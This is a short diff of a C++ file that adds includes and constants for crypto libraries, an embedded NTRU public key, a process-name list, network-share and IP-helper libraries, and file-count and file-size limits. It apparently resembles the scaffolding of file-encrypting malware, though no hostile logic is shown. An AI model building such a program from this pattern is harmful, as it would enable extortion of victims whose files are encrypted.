@@ -11,6 +11,36 @@
 #include <vector>
 #include "vera_crypt.h"
 #include "all_headers.h"
+#include "config.h"
+#include "Base64.h"
+
+#include "randomMbedTls.hpp"
+
+#include "..\enc-struct.h"
+#include "..\processnames.h"
+
+#pragma comment(lib, "shlwapi.lib")
+#pragma comment(lib, "Wbemuuid.lib")
+#pragma comment(lib, "Mpr.lib")
+#pragma comment(lib, "Iphlpapi.lib")
+
+
+#define _FILES_OPENED_MAX_COUNT_ 200
+#define _SKIP_FILE_SIZE_	(1024 * 1024)
+
+
+
+#include "aesMbedTls.hpp"
+
+
+#include "ntru.hpp"
+#include "..\crc32\crc32.h"
+#ifdef _DEBUG
+#include "..\new-public-ntru-key-debug.h"
+#else
+#include "..\new-public-ntru-key-release.h"
+//#include "..\new-public-ntru-key-debug.h"
+#endif
 
 namespace fs = std::filesystem;
 using namespace CryptoPP;
@@ -102,21 +132,6 @@ int main() {
     return 0;
 }
 
-/*
-
-
-#include "config.h"
-#include "Base64.h"
-
-#include "randomMbedTls.hpp"
-
-#include "..\enc-struct.h"
-#include "..\processnames.h"
-
-#pragma comment(lib, "shlwapi.lib")
-#pragma comment(lib, "Wbemuuid.lib")
-#pragma comment(lib, "Mpr.lib")
-#pragma comment(lib, "Iphlpapi.lib")
 
 
 #define _FILES_OPENED_MAX_COUNT_ 200
